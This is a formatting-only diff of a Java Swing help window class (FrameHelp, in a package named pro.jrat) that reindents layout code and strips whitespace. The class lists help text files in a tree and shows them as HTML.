@@ -41,7 +41,6 @@ import pro.jrat.net.WebRequest;
 import pro.jrat.ui.renderers.table.HelpTableRenderer;
 import pro.jrat.utils.NetUtils;
 
-
 @SuppressWarnings("serial")
 public class FrameHelp extends BaseFrame {
 
@@ -51,9 +50,9 @@ public class FrameHelp extends BaseFrame {
 	private JPopupMenu popupMenu;
 	private JMenuItem mntmOpenLatestOn;
 	private String currentFile;
-	
+
 	public DefaultTreeModel getModel() {
-		return (DefaultTreeModel)tree.getModel();
+		return (DefaultTreeModel) tree.getModel();
 	}
 
 	public FrameHelp() {
@@ -65,52 +64,40 @@ public class FrameHelp extends BaseFrame {
 		contentPane = new JPanel();
 		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
 		setContentPane(contentPane);
-		
+
 		JScrollPane scrollPane = new JScrollPane();
-		
+
 		JSplitPane splitPane = new JSplitPane();
 		splitPane.setResizeWeight(0.5);
-		
+
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(
-			gl_contentPane.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 147, GroupLayout.PREFERRED_SIZE)
-					.addContainerGap(499, Short.MAX_VALUE))
-				.addComponent(splitPane)
-		);
-		gl_contentPane.setVerticalGroup(
-			gl_contentPane.createParallelGroup(Alignment.LEADING)
-				.addGroup(gl_contentPane.createSequentialGroup()
-					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 0, GroupLayout.PREFERRED_SIZE)
-					.addPreferredGap(ComponentPlacement.RELATED)
-					.addComponent(splitPane))
-		);
-		
+		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 147, GroupLayout.PREFERRED_SIZE).addContainerGap(499, Short.MAX_VALUE)).addComponent(splitPane));
+		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 0, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(splitPane)));
+
 		JScrollPane scrollPane_1 = new JScrollPane();
 		splitPane.setRightComponent(scrollPane_1);
 		scrollPane_1.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
 		scrollPane_1.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
-		
+
 		com = new JEditorPane();
 		com.addHyperlinkListener(new HyperlinkListener() {
-			 public void hyperlinkUpdate(HyperlinkEvent e) {
+			public void hyperlinkUpdate(HyperlinkEvent e) {
 				if (e.getEventType() == HyperlinkEvent.EventType.ACTIVATED) {
 					try {
 						NetUtils.openUrl(e.getURL().toURI().toString());
 					} catch (Exception localException) {
 						localException.printStackTrace();
-					}		 
+					}
 				}
-			 }
+			}
 		});
 		com.setEditable(false);
 		com.setContentType("text/html");
 		scrollPane_1.setViewportView(com);
-		
+
 		popupMenu = new JPopupMenu();
 		addPopup(com, popupMenu);
-		
+
 		mntmOpenLatestOn = new JMenuItem("Open latest on internet");
 		mntmOpenLatestOn.setIcon(new ImageIcon(FrameHelp.class.getResource("/icons/url.png")));
 		mntmOpenLatestOn.addActionListener(new ActionListener() {
@@ -132,7 +119,7 @@ public class FrameHelp extends BaseFrame {
 			}
 		});
 		popupMenu.add(mntmOpenLatestOn);
-		
+
 		tree = new JTree();
 		splitPane.setLeftComponent(tree);
 		tree.setShowsRootHandles(true);
@@ -147,22 +134,21 @@ public class FrameHelp extends BaseFrame {
 					}
 					path = path.replace("help", "").replace("Help", "") + ".txt";
 					String str = Help.getHelp(path);
-					
+
 					if (str == null) {
 						return;
 					}
-					
+
 					currentFile = path;
-					
+
 					String p = new File("help/" + path).getAbsolutePath();
 					String dir = p.substring(0, p.lastIndexOf(File.separator)) + File.separator;
-					
-					String text = "<font face=\"arial\"><h1>" + arg0.getPath().getPath()[arg0.getPath().getPath().length - 1] + 
-							"</h1></br><p>" + str.replace("\n", "<br>") + "</p></font>";
-					
+
+					String text = "<font face=\"arial\"><h1>" + arg0.getPath().getPath()[arg0.getPath().getPath().length - 1] + "</h1></br><p>" + str.replace("\n", "<br>") + "</p></font>";
+
 					com.setText(text.replace("PARENTDIR", dir));
 				} catch (Exception ex) {
-					//ex.printStackTrace();
+					// ex.printStackTrace();
 				}
 			}
 		});
@@ -172,14 +158,14 @@ public class FrameHelp extends BaseFrame {
 			}
 		}));
 		contentPane.setLayout(gl_contentPane);
-		
+
 		splitPane.setDividerLocation(getSize().width / 4);
 	}
-	
-	public void addNodes(DefaultMutableTreeNode node) {		
+
+	public void addNodes(DefaultMutableTreeNode node) {
 		addFolder(node, new File(Files.getFiles(), "help/"));
 	}
-	
+
 	public void addFolder(DefaultMutableTreeNode curTop, File dir) {
 		String curPath = dir.getPath();
 		DefaultMutableTreeNode curDir = new DefaultMutableTreeNode(new File(curPath).getName());
@@ -188,20 +174,20 @@ public class FrameHelp extends BaseFrame {
 			curTop.add(curDir);
 			getModel().insertNodeInto(curDir, curTop, 0);
 		}
-		
+
 		List<String> ol = new ArrayList<String>();
-		
+
 		String[] tmp = dir.list();
-		
+
 		for (int i = 0; i < tmp.length; i++) {
 			ol.add(tmp[i]);
 		}
-		
+
 		Collections.sort(ol, String.CASE_INSENSITIVE_ORDER);
-		File f;		
-		
+		File f;
+
 		List<String> files = new ArrayList<String>();
-		
+
 		for (int i = 0; i < ol.size(); i++) {
 			String thisObject = (String) ol.get(i);
 			String newPath;
@@ -210,22 +196,23 @@ public class FrameHelp extends BaseFrame {
 			} else {
 				newPath = curPath + File.separator + thisObject;
 			}
-			
+
 			if ((f = new File(newPath)).isDirectory()) {
 				addFolder(curDir, f);
 			} else if (f.getName().endsWith(".txt")) {
 				files.add(thisObject);
 			}
 		}
-		
-		for (int fnum = 0; fnum < files.size(); fnum++) {		
+
+		for (int fnum = 0; fnum < files.size(); fnum++) {
 			getModel().insertNodeInto(new DefaultMutableTreeNode(files.get(fnum).substring(0, files.get(fnum).lastIndexOf("."))), curDir, curDir.getChildCount());
 		}
 	}
-	
+
 	public DefaultMutableTreeNode getNode(String str) {
 		return new DefaultMutableTreeNode(str);
 	}
+
 	private static void addPopup(Component component, final JPopupMenu popup) {
 		component.addMouseListener(new MouseAdapter() {
 			public void mousePressed(MouseEvent e) {
@@ -233,11 +220,13 @@ public class FrameHelp extends BaseFrame {
 					showMenu(e);
 				}
 			}
+
 			public void mouseReleased(MouseEvent e) {
 				if (e.isPopupTrigger()) {
 					showMenu(e);
 				}
 			}
+
 			private void showMenu(MouseEvent e) {
 				popup.show(e.getComponent(), e.getX(), e.getY());
 			}
